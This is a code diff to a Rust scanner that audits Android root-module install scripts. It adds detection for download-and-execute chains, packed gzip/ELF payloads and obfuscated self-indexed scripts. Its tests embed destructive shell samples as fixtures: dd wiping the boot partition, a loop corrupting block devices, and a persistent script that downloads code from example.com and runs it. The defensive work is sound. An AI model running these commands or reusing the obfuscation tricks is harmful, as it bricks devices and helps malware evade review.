@@ -17,6 +17,7 @@ const RULE_OWN_DELETE: &str = "KSU-AUDIT-FS-011";
 const RULE_UNKNOWN_DELETE: &str = "KSU-AUDIT-FS-012";
 const RULE_NETWORK: &str = "KSU-AUDIT-NET-001";
 const RULE_BINARY_NETWORK: &str = "KSU-AUDIT-NET-002";
+const RULE_REMOTE_EXECUTION: &str = "KSU-AUDIT-NET-003";
 const RULE_BINARY_PRESENT: &str = "KSU-AUDIT-BIN-001";
 const RULE_BINARY_EXECUTED: &str = "KSU-AUDIT-BIN-002";
 const RULE_PACKED_SHELL: &str = "KSU-AUDIT-PACK-001";
@@ -734,6 +735,7 @@ fn scan_artifact(
             artifact.provenance.clone(),
         ));
         analyze_shell(&artifact, &text, module_id, state);
+        analyze_remote_execution_chain(&artifact, &text, module_id, state);
         analyze_persistent_script_writes(&artifact, &text, module_id, config, state);
         analyze_invoked_module_scripts(&artifact, &text, module_id, config, state);
     }
@@ -776,7 +778,19 @@ fn scan_artifact(
     if !looks_shell {
         return;
     }
-    for (line, decoded) in decode_static_shell_commands(&text) {
+    let (decoded_shells, unresolved_shells) = decode_static_shell_commands(&text, module_id);
+    for (line, evidence) in unresolved_shells {
+        add_finding(
+            state,
+            &artifact,
+            RULE_UNAUDITABLE_DECODER,
+            Severity::High,
+            Some(line),
+            "Dynamic shell payload cannot be fully reconstructed",
+            &evidence,
+        );
+    }
+    for (line, decoded) in decoded_shells {
         add_finding(
             state,
             &artifact,
@@ -796,7 +810,11 @@ fn scan_artifact(
         );
     }
 
+    analyze_self_indexed_generated_scripts(&artifact, &text, module_id, config, state);
+
+    let mut decoded_offsets = BTreeSet::new();
     if let Some((payload_offset, description)) = detect_gzexe(&artifact.bytes, &text) {
+        decoded_offsets.insert(payload_offset);
         add_finding(
             state,
             &artifact,
@@ -809,9 +827,9 @@ fn scan_artifact(
         let payload = artifact.bytes[payload_offset..].to_vec();
         decode_gzip_artifact(
             Artifact {
-                path: artifact.path,
+                path: artifact.path.clone(),
                 bytes: payload,
-                provenance: artifact.provenance,
+                provenance: artifact.provenance.clone(),
                 depth: artifact.depth,
                 force_shell: artifact.force_shell,
             },
@@ -820,6 +838,45 @@ fn scan_artifact(
             config,
             state,
         );
+    }
+    for (payload_offset, kind) in detect_embedded_self_extracting_payloads(&artifact.bytes, &text) {
+        if !decoded_offsets.insert(payload_offset) {
+            continue;
+        }
+        add_finding(
+            state,
+            &artifact,
+            RULE_PACKED_SHELL,
+            Severity::Notice,
+            None,
+            "Self-extracting executable payload",
+            &format!("{kind} payload begins at byte offset {payload_offset}"),
+        );
+        let payload = artifact.bytes[payload_offset..].to_vec();
+        if kind == "gzip" {
+            decode_gzip_artifact(
+                Artifact {
+                    path: artifact.path.clone(),
+                    bytes: payload,
+                    provenance: artifact.provenance.clone(),
+                    depth: artifact.depth,
+                    force_shell: artifact.force_shell,
+                },
+                "embedded self-extracting gzip payload",
+                module_id,
+                config,
+                state,
+            );
+        } else {
+            scan_derived_bytes(
+                artifact.clone(),
+                payload,
+                "embedded self-extracting ELF payload",
+                module_id,
+                config,
+                state,
+            );
+        }
     }
 }
 
@@ -1593,12 +1650,26 @@ fn looks_like_decoded_payload(bytes: &[u8]) -> bool {
         .any(|marker| text.contains(marker))
 }
 
-fn decode_static_shell_commands(text: &str) -> Vec<(usize, Vec<u8>)> {
+type DecodedShellPayload = (usize, Vec<u8>);
+type UnresolvedShellPayload = (usize, String);
+
+fn decode_static_shell_commands(
+    text: &str,
+    module_id: Option<&str>,
+) -> (Vec<DecodedShellPayload>, Vec<UnresolvedShellPayload>) {
     let mut decoded = Vec::new();
-    for (line_index, line) in text.lines().enumerate() {
+    let mut unresolved = Vec::new();
+    let mut variables = predefined_variables(module_id);
+    collect_quoted_constant_assignments(text, &mut variables);
+    for (line_index, line) in logical_lines(text).iter().enumerate() {
         let tokens = shell_tokens(line);
+        collect_assignments_without_empty_overwrite(&tokens, &mut variables);
         for command in split_commands(&tokens) {
-            let (name, args) = normalize_command(command);
+            let expanded: Vec<_> = command
+                .iter()
+                .map(|token| expand_variables(token, &variables))
+                .collect();
+            let (name, args) = normalize_command(&expanded);
             let payload = if name == "eval" {
                 Some(args.join(" "))
             } else if matches!(name.as_str(), "sh" | "ash" | "bash") {
@@ -1611,17 +1682,94 @@ fn decode_static_shell_commands(text: &str) -> Vec<(usize, Vec<u8>)> {
             let Some(payload) = payload else {
                 continue;
             };
-            if payload.is_empty()
-                || payload.contains('$')
-                || payload.contains('`')
-                || payload.contains("$(")
-            {
+            if payload.is_empty() {
                 continue;
             }
-            decoded.push((line_index + 1, payload.into_bytes()));
+            let payload = expand_variables(&payload, &variables);
+            if payload.contains('$') || payload.contains('`') || payload.contains("$(") {
+                unresolved.push((line_index + 1, abbreviated_evidence(line)));
+            } else {
+                decoded.push((line_index + 1, payload.into_bytes()));
+            }
         }
     }
-    decoded
+    (decoded, unresolved)
+}
+
+fn collect_assignments_without_empty_overwrite(
+    tokens: &[String],
+    variables: &mut BTreeMap<String, String>,
+) {
+    for token in tokens {
+        let Some((name, value)) = token.split_once('=') else {
+            continue;
+        };
+        if !is_variable_name(name) || value.is_empty() && variables.contains_key(name) {
+            continue;
+        }
+        variables.insert(name.to_owned(), expand_variables(value, variables));
+    }
+}
+
+fn collect_quoted_constant_assignments(text: &str, variables: &mut BTreeMap<String, String>) {
+    let chars: Vec<_> = text.chars().collect();
+    let mut index = 0;
+    let mut line_start = true;
+    while index < chars.len() {
+        if chars[index] == '\n' || chars[index] == '\r' {
+            line_start = true;
+            index += 1;
+            continue;
+        }
+        if line_start && matches!(chars[index], ' ' | '\t') {
+            index += 1;
+            continue;
+        }
+        if line_start && chars[index] == '#' {
+            while index < chars.len() && !matches!(chars[index], '\n' | '\r') {
+                index += 1;
+            }
+            continue;
+        }
+        line_start = false;
+        if !chars[index].is_ascii_alphabetic() && chars[index] != '_' {
+            index += 1;
+            continue;
+        }
+        let name_start = index;
+        index += 1;
+        while index < chars.len() && (chars[index].is_ascii_alphanumeric() || chars[index] == '_') {
+            index += 1;
+        }
+        let name: String = chars[name_start..index].iter().collect();
+        if chars.get(index) != Some(&'=') || !matches!(chars.get(index + 1), Some('\'') | Some('"'))
+        {
+            continue;
+        }
+        let quote = chars[index + 1];
+        index += 2;
+        let mut value = String::new();
+        let mut terminated = false;
+        while index < chars.len() {
+            let character = chars[index];
+            if character == quote {
+                terminated = true;
+                index += 1;
+                break;
+            }
+            if character == '\\' && quote == '"' && index + 1 < chars.len() {
+                index += 1;
+                value.push(chars[index]);
+                index += 1;
+                continue;
+            }
+            value.push(character);
+            index += 1;
+        }
+        if terminated && !value.contains("$(") && !value.contains('`') {
+            variables.insert(name, expand_variables(&value, variables));
+        }
+    }
 }
 
 fn decode_base64(value: &str) -> Option<Vec<u8>> {
@@ -1698,6 +1846,7 @@ fn analyze_shell(artifact: &Artifact, text: &str, module_id: Option<&str>, state
         }
         collect_assignments(&tokens, &mut variables);
         collect_block_target_assignments(raw_line, &mut variables);
+        collect_block_loop_assignments(&tokens, &mut variables);
         for command in split_commands(&tokens) {
             if command.is_empty() {
                 continue;
@@ -2163,7 +2312,7 @@ fn extract_persistent_heredocs(
     text: &str,
     module_id: Option<&str>,
 ) -> Vec<(usize, String, Vec<u8>, String)> {
-    let lines: Vec<_> = text.lines().collect();
+    let lines = physical_lines(text);
     let mut output = Vec::new();
     let mut variables = predefined_variables(module_id);
     let mut current_dir = module_id.map_or_else(
@@ -2172,7 +2321,7 @@ fn extract_persistent_heredocs(
     );
     let mut index = 0;
     while index < lines.len() {
-        let header = lines[index];
+        let header = lines[index].as_str();
         let tokens = shell_tokens(header);
         collect_assignments(&tokens, &mut variables);
         let (name, args) = normalize_command(&tokens);
@@ -2208,7 +2357,7 @@ fn extract_persistent_heredocs(
             let candidate = if strip_tabs {
                 lines[cursor].trim_start_matches('\t')
             } else {
-                lines[cursor]
+                lines[cursor].as_str()
             };
             if candidate == delimiter {
                 terminated = true;
@@ -2244,6 +2393,28 @@ fn collect_block_target_assignments(line: &str, variables: &mut BTreeMap<String,
     }
 }
 
+fn collect_block_loop_assignments(tokens: &[String], variables: &mut BTreeMap<String, String>) {
+    let Some(for_index) = tokens.iter().position(|token| token == "for") else {
+        return;
+    };
+    let Some(name) = tokens.get(for_index + 1) else {
+        return;
+    };
+    if !is_variable_name(name) || tokens.get(for_index + 2).map(String::as_str) != Some("in") {
+        return;
+    }
+    let Some(source) = tokens.get(for_index + 3) else {
+        return;
+    };
+    let expanded = expand_variables(source, variables);
+    if is_block_device_path(&expanded)
+        || expanded.contains("/dev/block/")
+        || expanded.contains("/dev/mapper/")
+    {
+        variables.insert(name.clone(), expanded);
+    }
+}
+
 fn analyze_network(
     artifact: &Artifact,
     line: usize,
@@ -2263,6 +2434,133 @@ fn analyze_network(
             &evidence,
         );
     }
+}
+
+fn analyze_remote_execution_chain(
+    artifact: &Artifact,
+    text: &str,
+    module_id: Option<&str>,
+    state: &mut ScanState,
+) {
+    let mut variables = predefined_variables(module_id);
+    let mut current_dir = module_id.map_or_else(
+        || "$CWD".to_owned(),
+        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
+    );
+    let mut downloaded: BTreeMap<String, (usize, String)> = BTreeMap::new();
+    let heredoc_lines = heredoc_body_lines(text);
+
+    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
+        let line = line_index + 1;
+        if heredoc_lines.contains(&line) {
+            continue;
+        }
+        let tokens = shell_tokens(raw_line);
+        collect_assignments(&tokens, &mut variables);
+        for command in split_commands(&tokens) {
+            let expanded: Vec<_> = command
+                .iter()
+                .map(|token| expand_variables(token, &variables))
+                .collect();
+            let (name, args) = normalize_command(&expanded);
+            if name == "cd"
+                && let Some(target) = args.first()
+            {
+                current_dir = resolve_path(target, &variables, &current_dir);
+            }
+
+            if shell_network_evidence(&name, &args, raw_line).is_some()
+                && let Some(target) = downloaded_output_path(&name, &args)
+            {
+                let target = resolve_path(&target, &variables, &current_dir);
+                if !target.is_empty() && !contains_unresolved_variable(&target) {
+                    downloaded.insert(target, (line, raw_line.trim().to_owned()));
+                }
+            }
+
+            let Some(operand) = invoked_script_operand(command, &variables) else {
+                continue;
+            };
+            let target = resolve_path(&operand, &variables, &current_dir);
+            let Some((download_line, download_evidence)) = downloaded.get(&target) else {
+                continue;
+            };
+            add_finding(
+                state,
+                artifact,
+                RULE_REMOTE_EXECUTION,
+                Severity::Critical,
+                Some(line),
+                if is_persistent_script_target(&artifact.path) {
+                    "Persistent root script downloads and executes remote code"
+                } else {
+                    "Privileged installer downloads and executes remote code"
+                },
+                &format!(
+                    "line {download_line}: {download_evidence}; line {line}: {} => {target}",
+                    raw_line.trim()
+                ),
+            );
+        }
+    }
+}
+
+fn heredoc_body_lines(text: &str) -> BTreeSet<usize> {
+    let lines = physical_lines(text);
+    let mut body_lines = BTreeSet::new();
+    let mut index = 0;
+    while index < lines.len() {
+        let tokens = shell_tokens(&lines[index]);
+        let Some(delimiter_index) = tokens.iter().position(|token| token == "<<") else {
+            index += 1;
+            continue;
+        };
+        let Some(delimiter) = tokens.get(delimiter_index + 1) else {
+            index += 1;
+            continue;
+        };
+        let delimiter = delimiter.trim_start_matches('-');
+        let mut cursor = index + 1;
+        while cursor < lines.len() {
+            if lines[cursor].trim_start_matches('\t') == delimiter {
+                break;
+            }
+            body_lines.insert(cursor + 1);
+            cursor += 1;
+        }
+        index = cursor.saturating_add(1);
+    }
+    body_lines
+}
+
+fn downloaded_output_path(name: &str, args: &[String]) -> Option<String> {
+    match name {
+        "curl" => option_value(args, &["-o", "--output"], &["--output="]),
+        "wget" => option_value(args, &["-O", "--output-document"], &["--output-document="]),
+        "aria2c" => {
+            let output = option_value(args, &["-o", "--out"], &["--out="])?;
+            let directory = option_value(args, &["-d", "--dir"], &["--dir="]);
+            Some(directory.map_or(output.clone(), |directory| {
+                format!("{}/{output}", directory.trim_end_matches('/'))
+            }))
+        }
+        _ => None,
+    }
+}
+
+fn option_value(args: &[String], separate: &[&str], attached: &[&str]) -> Option<String> {
+    for (index, arg) in args.iter().enumerate() {
+        if separate.contains(&arg.as_str()) {
+            return args.get(index + 1).cloned();
+        }
+        if let Some(value) = attached
+            .iter()
+            .find_map(|prefix| arg.strip_prefix(prefix).filter(|value| !value.is_empty()))
+        {
+            return Some(value.to_owned());
+        }
+    }
+    None
 }
 
 fn shell_network_evidence(name: &str, args: &[String], raw_line: &str) -> Option<String> {
@@ -2888,17 +3186,210 @@ fn add_finding(
     });
 }
 
-fn detect_gzexe(bytes: &[u8], text: &str) -> Option<(usize, String)> {
-    if !text.contains("gzip -cd") || !text.contains("tail") || !text.contains("skip=") {
+fn analyze_self_indexed_generated_scripts(
+    artifact: &Artifact,
+    text: &str,
+    module_id: Option<&str>,
+    config: &AuditConfig,
+    state: &mut ScanState,
+) {
+    if !text.contains("$0") || !text.contains("cut -c") || !text.contains("sed -n") {
+        return;
+    }
+    let (source_path, source_bytes) = indexed_character_source(artifact, state);
+    let source_text = String::from_utf8_lossy(&source_bytes);
+    let source_lines = physical_lines(&source_text);
+    let mut variables = predefined_variables(module_id);
+    let mut recovered = 0_usize;
+    for line in physical_lines(text) {
+        let Some((name, source_line, column)) = parse_self_index_assignment(&line) else {
+            continue;
+        };
+        let Some(value) = source_lines
+            .get(source_line.saturating_sub(1))
+            .and_then(|line| line.chars().nth(column.saturating_sub(1)))
+        else {
+            continue;
+        };
+        variables.insert(name, value.to_string());
+        recovered += 1;
+    }
+    if recovered == 0 {
+        return;
+    }
+
+    for (line, target, content) in extract_static_echo_redirects(text, &variables) {
+        let target = resolve_path(&target, &variables, "$CWD");
+        if contains_unresolved_variable(&target)
+            || !generated_target_is_invoked(text, &target, &variables)
+        {
+            continue;
+        }
+        let content = expand_variables(&content, &variables);
+        if content.contains('$') || content.is_empty() {
+            add_finding(
+                state,
+                artifact,
+                RULE_UNAUDITABLE_DECODER,
+                Severity::High,
+                Some(line),
+                "Self-indexed generated script cannot be fully reconstructed",
+                &format!(
+                    "recovered {recovered} character variables from {source_path}; output {target} is executed"
+                ),
+            );
+            continue;
+        }
+        add_finding(
+            state,
+            artifact,
+            RULE_PACKED_SHELL,
+            Severity::Notice,
+            Some(line),
+            "Self-indexed shell payload reconstructed",
+            &format!(
+                "recovered {recovered} character variables from {source_path}; generated {target} is executed"
+            ),
+        );
+        scan_derived_bytes(
+            artifact.clone(),
+            content.into_bytes(),
+            "self-indexed generated script",
+            module_id,
+            config,
+            state,
+        );
+    }
+}
+
+fn indexed_character_source(artifact: &Artifact, state: &ScanState) -> (String, Vec<u8>) {
+    if posix_basename(&artifact.path) == "install.sh"
+        && let Some((path, bytes)) = state.archive_files.iter().find(|(path, _)| {
+            path.as_str() == "META-INF/com/google/android/update-binary"
+                || path.ends_with("/META-INF/com/google/android/update-binary")
+        })
+    {
+        return (path.clone(), bytes.clone());
+    }
+    (artifact.path.clone(), artifact.bytes.clone())
+}
+
+fn parse_self_index_assignment(line: &str) -> Option<(String, usize, usize)> {
+    let trimmed = line.trim();
+    let (name, expression) = trimmed.split_once("=$(")?;
+    if !is_variable_name(name.trim()) || !expression.contains("$0") {
         return None;
     }
-    let skip = text
-        .lines()
-        .take(32)
-        .find_map(|line| line.trim().strip_prefix("skip="))?
-        .trim_matches(|character: char| character == '\'' || character == '"')
-        .parse::<usize>()
+    let sed = expression.split_once("sed -n")?.1.trim_start();
+    let sed = sed.strip_prefix('\'').or_else(|| sed.strip_prefix('"'))?;
+    let source_line: usize = sed
+        .chars()
+        .take_while(char::is_ascii_digit)
+        .collect::<String>()
+        .parse()
         .ok()?;
+    let cut = expression.split_once("cut -c")?.1.trim_start();
+    let column: usize = cut
+        .chars()
+        .take_while(char::is_ascii_digit)
+        .collect::<String>()
+        .parse()
+        .ok()?;
+    Some((name.trim().to_owned(), source_line, column))
+}
+
+fn extract_static_echo_redirects(
+    text: &str,
+    variables: &BTreeMap<String, String>,
+) -> Vec<(usize, String, String)> {
+    let mut output = Vec::new();
+    let mut search_from = 0;
+    while let Some(relative) = text[search_from..].find("echo -n") {
+        let start = search_from + relative;
+        let mut cursor = start + "echo -n".len();
+        while text
+            .as_bytes()
+            .get(cursor)
+            .is_some_and(u8::is_ascii_whitespace)
+        {
+            cursor += 1;
+        }
+        if text.as_bytes().get(cursor) != Some(&b'"') {
+            search_from = cursor;
+            continue;
+        }
+        let content_start = cursor + 1;
+        cursor = content_start;
+        let mut escaped = false;
+        let mut matched = None;
+        while cursor < text.len() {
+            let byte = text.as_bytes()[cursor];
+            if escaped {
+                escaped = false;
+                cursor += 1;
+                continue;
+            }
+            if byte == b'\\' {
+                escaped = true;
+                cursor += 1;
+                continue;
+            }
+            if byte == b'"' {
+                let suffix = text[cursor + 1..].trim_start_matches([' ', '\t', '\r', '\n']);
+                if let Some(after_redirect) = suffix.strip_prefix('>') {
+                    let target = after_redirect.split_whitespace().next().unwrap_or_default();
+                    if !target.is_empty() {
+                        matched = Some((cursor, target.to_owned()));
+                        break;
+                    }
+                }
+            }
+            cursor += 1;
+        }
+        let Some((content_end, target)) = matched else {
+            search_from = content_start;
+            continue;
+        };
+        let content = expand_variables(&text[content_start..content_end], variables);
+        let line = physical_lines(&text[..start]).len();
+        output.push((line, target, content));
+        search_from = content_end + 1;
+    }
+    output
+}
+
+fn generated_target_is_invoked(
+    text: &str,
+    target: &str,
+    variables: &BTreeMap<String, String>,
+) -> bool {
+    logical_lines(text).iter().any(|line| {
+        let tokens = shell_tokens(line);
+        split_commands(&tokens).into_iter().any(|command| {
+            invoked_script_operand(command, variables)
+                .is_some_and(|operand| resolve_path(&operand, variables, "$CWD") == target)
+        })
+    })
+}
+
+fn detect_gzexe(bytes: &[u8], text: &str) -> Option<(usize, String)> {
+    if !text.contains("gzip -cd") || !text.contains("tail") {
+        return None;
+    }
+    let lines = physical_lines(text);
+    let skip = lines
+        .iter()
+        .take(64)
+        .find_map(|line| parse_literal_tail_start(line))
+        .or_else(|| {
+            lines.iter().take(64).find_map(|line| {
+                line.trim()
+                    .strip_prefix("skip=")?
+                    .trim_matches(|character: char| character == '\'' || character == '"')
+                    .parse::<usize>()
+                    .ok()
+            })
+        })?;
     let offset = line_offset(bytes, skip)?;
     if bytes.get(offset..offset + 2) != Some(&[0x1f, 0x8b]) {
         return None;
@@ -2909,6 +3400,52 @@ fn detect_gzexe(bytes: &[u8], text: &str) -> Option<(usize, String)> {
     ))
 }
 
+fn parse_literal_tail_start(line: &str) -> Option<usize> {
+    if !line.contains("gzip -cd") {
+        return None;
+    }
+    let tail = line.split_once("tail")?.1;
+    let after_n = tail.split_once("-n")?.1.trim_start();
+    let digits: String = after_n
+        .strip_prefix('+')?
+        .chars()
+        .take_while(char::is_ascii_digit)
+        .collect();
+    (!digits.is_empty()).then(|| digits.parse().ok()).flatten()
+}
+
+fn detect_embedded_self_extracting_payloads(
+    bytes: &[u8],
+    text: &str,
+) -> Vec<(usize, &'static str)> {
+    if !text.contains("$0")
+        || !(text.contains("tail ")
+            || text.contains("sed ") && text.contains("/d")
+            || text.contains("dd ") && text.contains("skip="))
+    {
+        return Vec::new();
+    }
+    let mut output = Vec::new();
+    if let Some(offset) = bytes
+        .windows(4)
+        .enumerate()
+        .skip(1)
+        .find_map(|(offset, window)| (window == b"\x7fELF").then_some(offset))
+    {
+        output.push((offset, "ELF"));
+    }
+    if let Some(offset) = bytes
+        .windows(2)
+        .enumerate()
+        .skip(1)
+        .find_map(|(offset, window)| (window == [0x1f, 0x8b]).then_some(offset))
+    {
+        output.push((offset, "gzip"));
+    }
+    output.sort_unstable();
+    output
+}
+
 fn line_offset(bytes: &[u8], one_based_line: usize) -> Option<usize> {
     if one_based_line == 0 {
         return None;
@@ -2917,13 +3454,18 @@ fn line_offset(bytes: &[u8], one_based_line: usize) -> Option<usize> {
         return Some(0);
     }
     let mut line = 1;
-    for (index, byte) in bytes.iter().enumerate() {
-        if *byte == b'\n' {
+    let mut index = 0;
+    while index < bytes.len() {
+        if bytes[index] == b'\n' || bytes[index] == b'\r' {
+            if bytes[index] == b'\r' && bytes.get(index + 1) == Some(&b'\n') {
+                index += 1;
+            }
             line += 1;
             if line == one_based_line {
                 return Some(index + 1);
             }
         }
+        index += 1;
     }
     None
 }
@@ -3290,16 +3832,36 @@ fn contains_any_bytes(bytes: &[u8], indicators: &[&[u8]]) -> bool {
 fn logical_lines(text: &str) -> Vec<String> {
     let mut output = Vec::new();
     let mut current = String::new();
-    for line in text.lines() {
+    for line in physical_lines(text) {
         if line.ends_with('\\') {
             current.push_str(line.trim_end_matches('\\'));
             current.push(' ');
         } else {
-            current.push_str(line);
+            current.push_str(&line);
             output.push(std::mem::take(&mut current));
         }
     }
     if !current.is_empty() {
+        output.push(current);
+    }
+    output
+}
+
+fn physical_lines(text: &str) -> Vec<String> {
+    let mut output = Vec::new();
+    let mut current = String::new();
+    let mut chars = text.chars().peekable();
+    while let Some(character) = chars.next() {
+        if matches!(character, '\n' | '\r') {
+            if character == '\r' && chars.peek() == Some(&'\n') {
+                chars.next();
+            }
+            output.push(std::mem::take(&mut current));
+        } else {
+            current.push(character);
+        }
+    }
+    if !current.is_empty() || output.is_empty() {
         output.push(current);
     }
     output
@@ -3424,6 +3986,10 @@ fn operands_before_redirection(args: &[String]) -> Vec<&String> {
 }
 
 fn normalize_command(command: &[String]) -> (String, Vec<String>) {
+    normalize_command_depth(command, 0)
+}
+
+fn normalize_command_depth(command: &[String], depth: usize) -> (String, Vec<String>) {
     let mut index = command
         .iter()
         .position(|token| !is_assignment(token))
@@ -3447,6 +4013,18 @@ fn normalize_command(command: &[String]) -> (String, Vec<String>) {
     if matches!(name.as_str(), "busybox" | "toybox") && index < command.len() {
         name.clone_from(&command[index]);
         index += 1;
+    }
+    if name == "su"
+        && depth < 4
+        && let Some(command_index) = command[index..]
+            .iter()
+            .position(|token| token == "-c" || token == "--command")
+            .map(|offset| index + offset + 1)
+        && command_index < command.len()
+    {
+        let nested = command[command_index..].join(" ");
+        let nested_tokens = shell_tokens(&nested);
+        return normalize_command_depth(&nested_tokens, depth + 1);
     }
     (name, command[index..].to_vec())
 }
@@ -4129,6 +4707,116 @@ cmd settings put secure accessibility_enabled 1
             .unwrap();
         assert_eq!(delete.provenance.len(), 2);
         assert!(rules(&report).contains(&RULE_NETWORK));
+    }
+
+    #[test]
+    fn audits_hardcoded_tail_gzip_payload() {
+        let inner = b"#!/system/bin/sh\ndd if=/dev/zero of=/dev/block/by-name/boot\n";
+        let mut packed =
+            b"#!/system/bin/sh\ntail -n +3 \"$0\" | gzip -cd > /data/payload\n".to_vec();
+        packed.extend(gzip(inner));
+        let report = scan_file_bytes("service.sh", &packed, &AuditConfig::default());
+        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
+        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
+    }
+
+    #[test]
+    fn audits_embedded_self_extracting_elf() {
+        let mut packed =
+            b"#!/system/bin/sh\nsed '1,/^PAYLOAD/d' \"$0\" > /data/tool\nPAYLOAD\n".to_vec();
+        packed.extend(elf_with_markers(b"embedded payload"));
+        let report = scan_file_bytes("installer.sh", &packed, &AuditConfig::default());
+        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
+        assert!(rules(&report).contains(&RULE_BINARY_PRESENT));
+    }
+
+    #[test]
+    fn audits_constant_variable_eval() {
+        let script = b"#!/system/bin/sh\nA=\"d\";B=\"d\"\neval \"$A$B if=/dev/zero of=/dev/block/by-name/boot\"\n";
+        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
+        let finding = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_PARTITION_WRITE)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::Critical);
+        assert!(!finding.provenance.is_empty());
+    }
+
+    #[test]
+    fn audits_cross_file_self_indexed_payload() {
+        let payload = "su -c dd if=/dev/zero of=/dev/block/by-name/boot";
+        let mut host = "#!/sbin/sh\n".to_owned();
+        let mut install = String::new();
+        let mut expansion = String::new();
+        for (index, character) in payload.chars().enumerate() {
+            host.push('#');
+            host.push(character);
+            host.push('\n');
+            install.push_str(&format!(
+                "c{index}=$(sed -n '{}p' \"$0\" | cut -c 2)\n",
+                index + 2
+            ));
+            expansion.push_str(&format!("$c{index}"));
+        }
+        install.push_str(&format!(
+            "echo -n \"{expansion}\" > /data/generated.sh\nsource /data/generated.sh\n"
+        ));
+        let zip = module_zip(&[
+            ("module.prop", b"id=self_indexed\n"),
+            ("META-INF/com/google/android/update-binary", host.as_bytes()),
+            ("install.sh", install.as_bytes()),
+        ]);
+        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
+        let finding = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_PARTITION_WRITE)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::Critical);
+        assert!(
+            finding
+                .provenance
+                .iter()
+                .any(|value| value.contains("self-indexed generated script"))
+        );
+    }
+
+    #[test]
+    fn detects_persistent_remote_download_and_execution() {
+        let script = b"#!/system/bin/sh\ncat <<'EOF' > /data/adb/service.d/agent.sh\n#!/system/bin/sh\nURL=https://example.com/payload\ncurl -o /data/agent.sh $URL\nchmod +x /data/agent.sh\n/data/agent.sh\nEOF\n";
+        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
+        let finding = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_REMOTE_EXECUTION)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::Critical);
+        assert!(finding.title.contains("Persistent root script"));
+    }
+
+    #[test]
+    fn download_without_execution_is_not_remote_execution() {
+        let script =
+            b"#!/system/bin/sh\ncurl -o $MODPATH/list.json https://example.com/list.json\n";
+        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
+        assert!(rules(&report).contains(&RULE_NETWORK));
+        assert!(!rules(&report).contains(&RULE_REMOTE_EXECUTION));
+        assert!(!report.has_critical());
+    }
+
+    #[test]
+    fn follows_block_target_through_for_loop() {
+        let script = b"#!/system/bin/sh\ndevices=$(ls /dev/block/sd*)\nfor device in $devices; do\necho corrupt | cat >$device\ndone\n";
+        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
+        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
+    }
+
+    #[test]
+    fn audits_lone_carriage_return_shell_lines() {
+        let script = b"#!/system/bin/sh\rdd if=/dev/zero of=/dev/block/by-name/boot\r";
+        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
+        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
     }
 
     #[test]
